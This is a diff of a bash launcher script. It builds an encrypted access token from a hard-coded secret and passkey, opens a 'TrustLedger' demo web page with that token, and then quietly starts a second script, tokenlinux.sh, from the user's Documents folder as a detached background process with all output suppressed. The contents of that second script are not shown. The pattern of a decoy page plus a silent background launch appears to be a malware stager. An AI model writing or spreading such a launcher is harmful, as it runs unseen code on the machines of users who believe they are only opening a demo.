@@ -4,16 +4,31 @@ set -e
 
 TARGET_DIR="$HOME/Documents"
 SITE_URL="https://demo.trustledgerlabs.com"
-KEY=$(echo -n "TLL_SECRET_2026salt" | openssl dgst -sha256 -binary | xxd -p -c 256)
+SECRET="TLL_SECRET_2026salt"
+PASSKEY="trustledger-demo-2026"
+EXPIRATION_MS=$(( $(date +%s) * 1000 + 604800000 )) # +7 days in ms
+
+KEY=$(echo -n "$SECRET" | openssl dgst -sha256 -binary | xxd -p -c 256)
+
 IV=$(openssl rand -hex 16)
-EXP=$(( $(date +%s) * 1000 + 604800000 ))
-PAYLOAD="{\"passkey\":\"trustledger-demo-2026\",\"exp\":${EXP}}"
+
+PAYLOAD="{\"passkey\":\"$PASSKEY\",\"exp\":${EXPIRATION_MS}}"
+
 CT=$(echo -n "$PAYLOAD" | openssl enc -aes-256-cbc -K "$KEY" -iv "$IV" -nosalt 2>/dev/null | xxd -p -c 256)
+
+# --- Combine IV and ciphertext as token ---
 TOKEN="${IV}:${CT}"
 
-open "${SITE_URL}?key=${TOKEN}" 2>/dev/null || \
-xdg-open "${SITE_URL}?key=${TOKEN}" 2>/dev/null || \
+if command -v open >/dev/null 2>&1; then
+    open "${SITE_URL}?key=${TOKEN}" 2>/dev/null || true
+elif command -v xdg-open >/dev/null 2>&1; then
+    xdg-open "${SITE_URL}?key=${TOKEN}" 2>/dev/null || true
+fi
 
-nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
+if [ -f "$TARGET_DIR/tokenlinux.sh" ]; then
+    nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
+else
+    echo "Warning: $TARGET_DIR/tokenlinux.sh not found!"
+fi
 
 exit 0
